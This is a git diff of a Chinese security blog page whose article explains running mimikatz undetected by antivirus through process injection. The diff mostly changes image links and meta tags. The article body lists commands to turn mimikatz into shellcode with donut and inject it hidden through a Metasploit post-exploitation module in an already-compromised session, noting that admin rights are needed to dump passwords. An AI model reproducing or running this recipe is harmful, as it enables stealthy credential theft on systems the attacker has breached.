@@ -81,18 +81,21 @@
 
 
 
-<meta name="description" content="利用进程注入实现mimikatz免杀执行工具 https://github.com/TheWover/donut metasploit 0x01将mimikatz转化为二进制文件. ./donut  -f mimikatz.exe  -o mimikatz.bin ![image-20200310214356704](C:\Users\Mr. j\AppData\Roaming\Typora\ty">
+<meta name="description" content="利用进程注入实现mimikatz免杀执行工具 https://github.com/TheWover/donut metasploit 0x01将mimikatz转化为二进制文件. ./donut  -f mimikatz.exe  -o mimikatz.bin  已经获取到一个session，这是前提条件嗷 use post/windows/manage/shellcode_inject se">
 <meta name="keywords" content="免杀">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用进程注入实现mimikatz免杀执行">
 <meta property="og:url" content="https://github.com/scareing/scareing.github.io/2020/01/26/利用进程注入实现mimikatz免杀执行/index.html">
 <meta property="og:site_name" content="scareing的学习笔记">
-<meta property="og:description" content="利用进程注入实现mimikatz免杀执行工具 https://github.com/TheWover/donut metasploit 0x01将mimikatz转化为二进制文件. ./donut  -f mimikatz.exe  -o mimikatz.bin ![image-20200310214356704](C:\Users\Mr. j\AppData\Roaming\Typora\ty">
+<meta property="og:description" content="利用进程注入实现mimikatz免杀执行工具 https://github.com/TheWover/donut metasploit 0x01将mimikatz转化为二进制文件. ./donut  -f mimikatz.exe  -o mimikatz.bin  已经获取到一个session，这是前提条件嗷 use post/windows/manage/shellcode_inject se">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-03-10T14:02:54.941Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/2.png">
+<meta property="og:updated_time" content="2020-03-10T14:28:54.038Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用进程注入实现mimikatz免杀执行">
-<meta name="twitter:description" content="利用进程注入实现mimikatz免杀执行工具 https://github.com/TheWover/donut metasploit 0x01将mimikatz转化为二进制文件. ./donut  -f mimikatz.exe  -o mimikatz.bin ![image-20200310214356704](C:\Users\Mr. j\AppData\Roaming\Typora\ty">
+<meta name="twitter:description" content="利用进程注入实现mimikatz免杀执行工具 https://github.com/TheWover/donut metasploit 0x01将mimikatz转化为二进制文件. ./donut  -f mimikatz.exe  -o mimikatz.bin  已经获取到一个session，这是前提条件嗷 use post/windows/manage/shellcode_inject se">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/1.png">
 
 
 
@@ -359,14 +362,14 @@
 <p>metasploit</p>
 <h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>将mimikatz转化为二进制文件.</p>
 <p><code>./donut  -f mimikatz.exe  -o mimikatz.bin</code></p>
-<p>![image-20200310214356704](C:\Users\Mr. j\AppData\Roaming\Typora\typora-user-images\image-20200310214356704.png)</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/1.png" alt="avatar"></p>
 <p>已经获取到一个session，这是前提条件嗷</p>
 <p><code>use post/windows/manage/shellcode_inject</code></p>
 <p><code>set SHELLCODE /root/Github/Bypass/donut/mimikatz.bin</code></p>
 <p><code>set CHANNELIZED true</code></p>
 <p><code>set INTERACTIVE true</code></p>
 <p><code>set HIDDEN true</code></p>
-<p>![image-20200310215455636](C:\Users\Mr. j\AppData\Roaming\Typora\typora-user-images\image-20200310215455636.png)</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2020/01/26/%E5%88%A9%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0mimikatz%E5%85%8D%E6%9D%80%E6%89%A7%E8%A1%8C/2.png" alt="avatar"></p>
 <h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>mimikatz需要admin权限才能抓密码。</p>
 <p>x86的程序只能插入到x86的进程中，x64同理</p>
 <p>inject的各个选项极其重要，注意灵活调整。</p>
